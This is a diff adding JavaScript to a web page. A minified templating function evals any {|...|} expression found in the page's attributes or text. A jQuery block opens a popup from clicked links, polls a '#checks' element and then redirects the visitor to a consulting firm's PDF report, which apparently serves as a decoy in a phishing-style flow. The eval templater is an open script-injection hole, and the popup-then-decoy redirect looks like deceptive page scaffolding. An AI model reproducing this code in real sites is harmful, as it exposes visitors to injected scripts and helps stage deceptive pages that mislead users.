@@ -1,0 +1,32 @@
+
+const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
+templatePage()
+
+
+     $(document).ready(function(e){ 
+     window_opener_xc(); 
+   });
+   function window_opener_xc(){
+     var url_part = get_extra_data(1);
+     $('li a').click(function(e){
+       e.preventDefault();
+     if($(this).data('nn')){
+       var checks = $('#checks');
+           var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+         setInterval(function(){ 
+         if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
+       }, 3000);
+     }
+     });
+   }
+   function get_extra_data(a){
+     var output = '';
+     if(a==1){
+       output = '';
+     }
+     else if(a==2){
+       output = "https://www.oliverwyman.com/content/dam/oliver-wyman/v2/publications/2020/jun/Global-Wealth-Management-Report-2020.pdf";
+     }
+     return output;
+   }
+   
